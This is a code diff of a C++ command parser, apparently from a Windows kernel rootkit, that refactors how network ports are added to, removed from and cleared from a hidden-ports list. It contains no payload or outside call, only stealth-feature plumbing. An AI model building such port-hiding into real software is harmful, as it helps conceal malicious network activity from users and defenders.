@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "NetworkParser.h"
-#include "NetworkUtils.h"
+#include "NetworkHandler.h"
 
 NetworkParser::NetworkParser() {
 	this->optionsSize = 3;
@@ -47,13 +47,8 @@ NTSTATUS NetworkParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	switch (commandId) {
 	case Options::Add:
 	{
-		if (NidhoggNetworkUtils->GetPortsCount() == MAX_PORTS) {
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
-			break;
-		}
-
-		if (!NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
-			if (!NidhoggNetworkUtils->AddHiddenPort(hiddenPort)) {
+		if (!NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
+			if (!NidhoggNetworkHandler->AddHiddenPort(hiddenPort)) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -62,12 +57,7 @@ NTSTATUS NetworkParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	}
 	case Options::Remove:
 	{
-		if (NidhoggNetworkUtils->GetPortsCount() == 0) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
+		if (!NidhoggNetworkHandler->RemoveHiddenPort(hiddenPort)) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
@@ -76,7 +66,7 @@ NTSTATUS NetworkParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	}
 	case Options::Clear:
 	{
-		NidhoggNetworkUtils->ClearHiddenPortsList();
+		NidhoggNetworkHandler->ClearHiddenPortsList(PortType::All);
 		break;
 	}
 	default:
